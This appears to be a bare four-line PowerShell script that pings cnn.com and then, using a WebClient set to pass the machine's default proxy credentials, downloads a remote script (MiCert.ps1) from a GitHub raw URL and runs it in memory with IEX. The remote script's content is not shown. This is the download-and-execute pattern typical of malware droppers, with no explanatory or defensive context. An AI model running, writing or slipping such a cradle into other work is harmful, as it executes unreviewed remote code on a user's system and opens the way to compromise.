ping cnn.com
$browser = New-Object System.Net.WebClient
$browser.Proxy.Credentials=[System.Net.CredentialCache]::DefaultNetworkCredentials
IEX($browser.DownloadString("https://raw.githubusercontent.com/argene-nyc/sevilla/master/MiCert.ps1"))
